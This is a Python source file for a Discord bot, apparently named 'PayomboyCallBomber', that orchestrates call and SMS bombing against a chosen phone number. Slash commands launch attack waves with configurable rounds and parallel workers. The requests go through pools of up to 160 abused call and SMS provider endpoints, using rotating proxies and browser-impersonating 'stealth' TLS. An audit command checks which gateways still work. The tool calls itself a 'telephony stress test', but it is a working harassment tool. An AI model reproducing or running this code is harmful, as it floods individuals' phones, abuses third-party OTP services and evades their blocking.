import os
import sys
import asyncio
import discord
from discord import app_commands
from discord.ext import commands
from typing import Optional, Literal

from bot.config import BotConfig
from bot.security import SecurityGuard
from bot.views import (
    ControlPanelView,
    build_panel_embed,
    build_bomber_v2_payload,
    send_bomber_v2_panel,
    edit_bomber_v2_panel,
    AttackModal,
    current_engine_instance,
    get_active_providers_file,
    get_active_banner_path,
    PROVIDERS_FILE,
    PROXIES_FILE
)
from core.exporter import ProviderExporter
from core.phone import PhoneNumber
from core.provider import ProviderLoader, Provider
from core.engine import AttackEngine, HAS_CURL_CFFI
from core.proxy import ProxyManager
from core.settings import SettingsManager

# Setup discord intents
intents = discord.Intents.default()
intents.messages = True

class PayomboyBot(commands.Bot):
    def __init__(self):
        super().__init__(
            command_prefix="!",
            intents=intents,
            help_command=None
        )

    async def setup_hook(self):
        # Register persistent view so button callbacks survive restarts
        self.add_view(ControlPanelView())

        # Sync application slash commands globally
        try:
            synced = await self.tree.sync()
            print(f"[+] Synced {len(synced)} Slash Commands globally.", flush=True)
        except Exception as e:
            print(f"[-] Slash command sync warning: {e}", flush=True)

    async def on_ready(self):
        print(f"[+] PayomboyBot online as: {self.user} (ID: {self.user.id})", flush=True)
        print(f"[+] Zero-Attachment & Anti-Malware Protection: ACTIVE", flush=True)
        await self.change_presence(
            activity=discord.Activity(
                type=discord.ActivityType.watching,
                name="Telephony Defense & Audit (/panel)"
            )
        )

    async def on_message(self, message: discord.Message):
        if message.author == self.user:
            return

        if not SecurityGuard.verify_message_attachments(message):
            try:
                await message.delete()
                await message.channel.send(
                    f"🛡️ **Security Alert**: {message.author.mention}, your message contained a blocked/dangerous file attachment and was deleted for server safety.",
                    delete_after=10
                )
            except Exception:
                pass
            return

        await self.process_commands(message)


bot = PayomboyBot()

# ─────────────────────────────────────────────────────────────
# SLASH COMMANDS
# ─────────────────────────────────────────────────────────────

async def _deploy_panel(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False)

    if not SecurityGuard.is_admin(interaction):
        return await interaction.followup.send(
            "❌ **Access Denied**: Administrator permission required to deploy the Control Panel.",
            ephemeral=True
        )

    token = interaction.client.http.token if interaction.client and interaction.client.http else None
    ok, res = await send_bomber_v2_panel(interaction.channel_id, bot_token=token)
    if ok:
        await interaction.followup.send("✅ **ติดตั้งแผงควบคุม Payomboy Call Bomber (Components V2) สำเร็จเรียบร้อยแล้ว!**", ephemeral=True)
    else:
        embed = build_panel_embed()
        view = ControlPanelView()
        banner_path = get_active_banner_path()
        if banner_path and os.path.exists(banner_path):
            file = discord.File(banner_path, filename="banner.gif")
            await interaction.followup.send(embed=embed, file=file, view=view)
        else:
            await interaction.followup.send(embed=embed, view=view)


@bot.tree.command(name="set_panel", description="Deploy the interactive PayomboyCallBomber Control Panel")
async def cmd_set_panel(interaction: discord.Interaction):
    await _deploy_panel(interaction)


@bot.tree.command(name="panel", description="Quick shortcut to deploy the Control Panel")
async def cmd_panel(interaction: discord.Interaction):
    await _deploy_panel(interaction)


@bot.tree.command(name="card", description="Switch active Card GIF banner for the Control Panel")
@app_commands.describe(choice="card1: Balaclava Toxic Matrix | card2: Balaclava SMS Bomber")
async def cmd_card(interaction: discord.Interaction, choice: Literal["card1", "card2"]):
    if not SecurityGuard.is_admin(interaction):
        return await interaction.response.send_message("❌ **Access Denied**: Administrator permission required.", ephemeral=True)

    SettingsManager.set_active_banner(choice)
    label = "Option 1 (Balaclava Toxic Matrix • CALL BOMBER)" if choice == "card1" else "Option 2 (Balaclava Ninja Overdrive • SMS BOMBER)"
    await interaction.response.send_message(
        f"🎨 **Panel Banner Configured**: Active card set to **{label}**!\n*Deploy `/panel` to see the new animated card banner.*",
        ephemeral=True
    )


@bot.tree.command(name="set_channel", description="Set dedicated text channel for attack results & telemetry")
@app_commands.describe(channel="Text channel to route all stress-test reports and live traces to")
async def cmd_set_channel(interaction: discord.Interaction, channel: discord.TextChannel):
    if not SecurityGuard.is_admin(interaction):
        return await interaction.response.send_message("❌ **Access Denied**: Administrator permission required.", ephemeral=True)

    SettingsManager.set_output_channel_id(channel.id)
    await interaction.response.send_message(
        f"📍 **Results Channel Configured**: All stress-test summaries & live telemetry will now broadcast to {channel.mention}!\n*Deploy `/panel` to see updated panel bindings.*",
        ephemeral=False
    )


@bot.tree.command(name="clear_channel", description="Clear output channel and restore default channel output")
async def cmd_clear_channel(interaction: discord.Interaction):
    if not SecurityGuard.is_admin(interaction):
        return await interaction.response.send_message("❌ **Access Denied**: Administrator permission required.", ephemeral=True)

    SettingsManager.set_output_channel_id(None)
    await interaction.response.send_message(
        "📍 **Results Channel Cleared**: Outputs restored to current channels.",
        ephemeral=False
    )


@bot.tree.command(name="allow_channel", description="Allow everyone in a specific channel to use the bot")
@app_commands.describe(channel="Text channel where all members can use the bot")
async def cmd_allow_channel(interaction: discord.Interaction, channel: discord.TextChannel):
    if not SecurityGuard.is_admin(interaction):
        return await interaction.response.send_message("❌ **Access Denied**: Administrator permission required.", ephemeral=True)

    SettingsManager.add_allowed_channel(channel.id)
    await interaction.response.send_message(
        f"✅ **Channel Authorized**: Everyone in {channel.mention} (`{channel.id}`) can now use the bot!",
        ephemeral=False
    )


@bot.tree.command(name="disallow_channel", description="Revoke public bot access from a specific channel")
@app_commands.describe(channel="Text channel to remove public bot access from")
async def cmd_disallow_channel(interaction: discord.Interaction, channel: discord.TextChannel):
    if not SecurityGuard.is_admin(interaction):
        return await interaction.response.send_message("❌ **Access Denied**: Administrator permission required.", ephemeral=True)

    SettingsManager.remove_allowed_channel(channel.id)
    await interaction.response.send_message(
        f"🚫 **Channel Revoked**: Public bot access removed from {channel.mention} (`{channel.id}`).",
        ephemeral=False
    )


@bot.tree.command(name="allowed_channels", description="List channels where everyone can use the bot")
async def cmd_allowed_channels(interaction: discord.Interaction):
    channels = SettingsManager.get_allowed_channels()
    if not channels:
        desc = "No public channels configured. Only administrators can use the bot."
    else:
        desc = "\n".join(f"• <#{cid}> (`{cid}`)" for cid in channels)

    embed = discord.Embed(title="📍 Authorized Bot Channels", description=desc, color=0x00ffcc)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="pool", description="Switch active provider pool between Verified and Master")
@app_commands.describe(choice="verified = 13 Vetted High-Yield | master = 160 Full Matrix")
async def cmd_pool(interaction: discord.Interaction, choice: Literal["verified", "master"]):
    if not SecurityGuard.is_authorized(interaction):
        return await interaction.response.send_message("❌ **Access Denied**: Unauthorized user.", ephemeral=True)

    SettingsManager.set_active_pool(choice)
    badge = "⚡ Verified High-Yield (13 Endpoints)" if choice == "verified" else "🔥 Master Matrix (160 Endpoints)"
    await interaction.response.send_message(
        f"🎯 **Provider Pool Switched**: Active pool set to **{badge}**.",
        ephemeral=False
    )


@bot.tree.command(name="attack", description="Directly dispatch a telephony stress test against a target")
@app_commands.describe(
    target="Phone number to test (e.g. 0812345678 or +66812345678)",
    mode="Attack mode: all (Call & SMS), call (Voice Only), sms (SMS Only)",
    rounds="Number of attack waves (1 to 50)",
    concurrency="Parallel worker count (1 to 50)"
)
async def cmd_attack(
    interaction: discord.Interaction,
    target: str,
    mode: Literal["all", "call", "sms"] = "all",
    rounds: int = 1,
    concurrency: int = 8
):
    global current_engine_instance

    # 1. Auth check
    if not SecurityGuard.is_authorized(interaction):
        allowed_ch = SettingsManager.get_allowed_channels()
        ch_hint = f" Please use in {', '.join(f'<#{cid}>' for cid in allowed_ch)}." if allowed_ch else ""
        return await interaction.response.send_message(
            f"❌ **Access Denied**: Unauthorized user or channel.{ch_hint}",
            ephemeral=True
        )

    # 2. Busy check
    if SecurityGuard.is_engine_busy():
        return await interaction.response.send_message(
            "⚠️ **Engine Busy**: An operation is currently running. Please wait or stop the current test.",
            ephemeral=True
        )

    # 3. Cooldown check
    is_ready, remaining = SecurityGuard.check_cooldown(interaction.user.id)
    if not is_ready:
        return await interaction.response.send_message(
            f"⏳ **Rate Limited**: Please wait **{remaining:.1f}s** before launching another attack.",
            ephemeral=True
        )

    # 4. Input sanitization
    is_valid, clean_phone, err = SecurityGuard.sanitize_phone(target)
    if not is_valid:
        return await interaction.response.send_message(f"❌ **Input Error**: {err}", ephemeral=True)

    safe_rounds, safe_conc = SecurityGuard.validate_attack_params(rounds, concurrency)

    SecurityGuard.trigger_cooldown(interaction.user.id)
    SecurityGuard.set_engine_state(True, target=clean_phone)

    out_ch_id = SettingsManager.get_output_channel_id()
    ch_mention = f"<#{out_ch_id}>" if out_ch_id else "this channel"

    await interaction.response.send_message(
        f"🚀 **Dispatching Attack**\nTarget: `{clean_phone}` | Mode: `{mode.upper()}` | Rounds: `{safe_rounds}` | Workers: `{safe_conc}`\n📍 Results will broadcast in: {ch_mention}",
        ephemeral=True
    )

    async def run_task():
        global current_engine_instance
        trace_logs = []

        def on_endpoint_result(prov: Provider, success: bool, status_code: int, latency_ms: float, error_msg: Optional[str]):
            badge = "🟢 OK" if success else f"🔴 FAIL ({error_msg or status_code})"
            type_tag = "[CALL]" if prov.type == "call" else "[SMS]"
            trace_logs.append(f"{type_tag} `{prov.name[:20]:<20}` {badge} `{latency_ms:.0f}ms`")

        try:
            phone = PhoneNumber(clean_phone)
            active_file = get_active_providers_file()
            providers = ProviderLoader.load(active_file)
            proxy_mgr = ProxyManager(PROXIES_FILE)

            engine = AttackEngine(
                providers=providers,
                phone=phone,
                mode=mode,
                max_concurrency=safe_conc,
                proxy_manager=proxy_mgr,
                on_result=on_endpoint_result,
                use_stealth=True
            )
            current_engine_instance = engine
            await engine.run(rounds=safe_rounds, delay_between_rounds=0.5)

            stats = engine.stats

            if stats.total_sent == 0:
                title = "❌ Telephony Test Failed (0 Requests Dispatched)"
                color = 0xff0000
            elif stats.success == 0:
                title = "⚠️ Telephony Test Completed — 0 Delivered (All Rejected / Blocked)"
                color = 0xff3333
            elif stats.failed > 0:
                title = f"⚡ Telephony Test Completed ({stats.success}/{stats.total_sent} Delivered)"
                color = 0xffaa00
            else:
                title = "✅ Telephony Test Completed (100% Delivered)"
                color = 0x00ff88

            summary_embed = discord.Embed(title=title, color=color)
            summary_embed.add_field(name="Target", value=f"`{phone.formatted_local}`", inline=True)
            summary_embed.add_field(name="Mode", value=f"`{mode.upper()}`", inline=True)
            summary_embed.add_field(name="Total Sent", value=f"**{stats.total_sent}**", inline=True)
            summary_embed.add_field(name="Successful", value=f"🟢 **{stats.success}**", inline=True)
            summary_embed.add_field(name="Failed", value=f"🔴 **{stats.failed}**", inline=True)
            summary_embed.add_field(name="Voice Calls", value=f"`{stats.call_success} OK / {stats.call_failed} Fail`", inline=True)
            summary_embed.add_field(name="SMS OTPs", value=f"`{stats.sms_success} OK / {stats.sms_failed} Fail`", inline=True)
            summary_embed.add_field(name="Elapsed Time", value=f"`{stats.elapsed:.2f}s`", inline=True)
            summary_embed.add_field(name="Throughput Speed", value=f"`{stats.req_per_sec:.2f} req/s`", inline=True)

            if trace_logs:
                trace_sample = "\n".join(trace_logs[:15])
                if len(trace_logs) > 15:
                    trace_sample += f"\n*...and {len(trace_logs) - 15} more responses*"
                summary_embed.add_field(name="Endpoint Trace (Real Live Responses)", value=trace_sample, inline=False)

            dest_channel = None
            if out_ch_id and interaction.client:
                dest_channel = interaction.client.get_channel(out_ch_id)

            if dest_channel:
                await dest_channel.send(embed=summary_embed)
                try:
                    await interaction.channel.send(
                        f"✅ **Stress-Test Finished**: Telemetry report dispatched to {dest_channel.mention}!",
                        delete_after=15
                    )
                except Exception:
                    pass
            else:
                await interaction.channel.send(embed=summary_embed)

        except Exception as e:
            try:
                await interaction.channel.send(f"❌ **Execution Error**: `{str(e)[:100]}`")
            except Exception:
                pass
        finally:
            current_engine_instance = None
            SecurityGuard.set_engine_state(False, None)

    asyncio.create_task(run_task())


@bot.tree.command(name="audit", description="Benchmark provider health and responsiveness")
async def cmd_audit(interaction: discord.Interaction):
    if not SecurityGuard.is_authorized(interaction):
        return await interaction.response.send_message("❌ **Access Denied**: Unauthorized user.", ephemeral=True)

    if SecurityGuard.is_engine_busy():
        return await interaction.response.send_message("⚠️ **Engine Busy**: An operation is active.", ephemeral=True)

    await interaction.response.defer(ephemeral=True)
    SecurityGuard.set_engine_state(True, target="AUDIT_BENCHMARK")

    try:
        providers = ProviderLoader.load(PROVIDERS_FILE)
        phone = PhoneNumber("0812345678")
        alive_names = []
        audit_trace = []

        def on_audit_result(prov: Provider, success: bool, status_code: int, latency_ms: float, error_msg: Optional[str]):
            badge = "🟢 OK" if success else f"🔴 FAIL ({error_msg or status_code})"
            type_tag = "[CALL]" if prov.type == "call" else "[SMS]"
            audit_trace.append(f"{type_tag} `{prov.name[:18]:<18}` {badge}")
            if success:
                alive_names.append(prov.name)

        engine = AttackEngine(
            providers=providers,
            phone=phone,
            mode="all",
            max_concurrency=4,
            on_result=on_audit_result,
            use_stealth=True
        )
        await engine.run(rounds=1, delay_between_rounds=0)
        stats = engine.stats

        if len(alive_names) >= 5:
            ProviderExporter.export_verified(providers, alive_names, get_active_providers_file())

        embed = discord.Embed(
            title="🔍 Provider Health Audit Report",
            description=f"Benchmark finished. {len(alive_names)} verified alive.",
            color=0x3399ff
        )
        embed.add_field(name="Endpoints Scanned", value=str(stats.total_sent), inline=True)
        embed.add_field(name="Alive (Verified)", value=f"🟢 **{stats.success}**", inline=True)
        embed.add_field(name="Blocked / Dead", value=f"🔴 **{stats.failed}**", inline=True)
        embed.add_field(name="Audit Time", value=f"`{stats.elapsed:.2f}s`", inline=True)

        if audit_trace:
            sample = "\n".join(audit_trace[:15])
            if len(audit_trace) > 15:
                sample += f"\n*...and {len(audit_trace) - 15} more*"
            embed.add_field(name="Gateway Trace", value=sample, inline=False)

        await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ **Audit Failed**: `{str(e)[:100]}`", ephemeral=True)
    finally:
        SecurityGuard.set_engine_state(False, None)


@bot.tree.command(name="stop", description="Emergency stop any active running attack")
async def cmd_stop(interaction: discord.Interaction):
    global current_engine_instance
    if not SecurityGuard.is_authorized(interaction):
        return await interaction.response.send_message("❌ **Access Denied**: Unauthorized user.", ephemeral=True)

    if current_engine_instance:
        current_engine_instance.stop()
        SecurityGuard.set_engine_state(False, None)
        await interaction.response.send_message("🛑 **Emergency Stop**: Active engine stopped.", ephemeral=False)
    else:
        await interaction.response.send_message("ℹ️ No active attack is running.", ephemeral=True)


@bot.tree.command(name="status", description="Check PayomboyCallBomber system health and statistics")
async def cmd_status(interaction: discord.Interaction):
    active_file = get_active_providers_file()
    providers = ProviderLoader.load(active_file)
    call_count = len([p for p in providers if p.type == "call"])
    sms_count = len([p for p in providers if p.type == "sms"])
    tls_engine = "curl_cffi (Chrome124 Stealth)" if HAS_CURL_CFFI else "httpx (Standard OpenSSL)"
    out_ch_id = SettingsManager.get_output_channel_id()
    ch_mention = f"<#{out_ch_id}>" if out_ch_id else "`Current Channel`"

    embed = discord.Embed(title="📊 PayomboyCallBomber System Status", color=0x00ccff)
    embed.add_field(name="Engine State", value="`BUSY`" if SecurityGuard.is_engine_busy() else "`IDLE`", inline=True)
    embed.add_field(name="Active Target", value=f"`{SecurityGuard.get_active_target() or 'None'}`", inline=True)
    embed.add_field(name="Stealth Mode", value=f"`{tls_engine}`", inline=True)
    embed.add_field(name="Active Pool", value=f"`{SettingsManager.get_active_pool().upper()}`", inline=True)
    embed.add_field(name="Total Providers", value=str(len(providers)), inline=True)
    embed.add_field(name="Output Channel", value=ch_mention, inline=True)
    embed.add_field(name="Voice Gateways", value=str(call_count), inline=True)
    embed.add_field(name="SMS Gateways", value=str(sms_count), inline=True)
    embed.add_field(name="Anti-Malware", value="`ACTIVE (Zero-Attachment Policy)`", inline=False)

    await interaction.response.send_message(embed=embed, ephemeral=True)


def run_discord_bot():
    BotConfig.validate()
    print("[*] Starting PayomboyCallBomber Discord Bot...")
    bot.run(BotConfig.TOKEN)

if __name__ == "__main__":
    run_discord_bot()
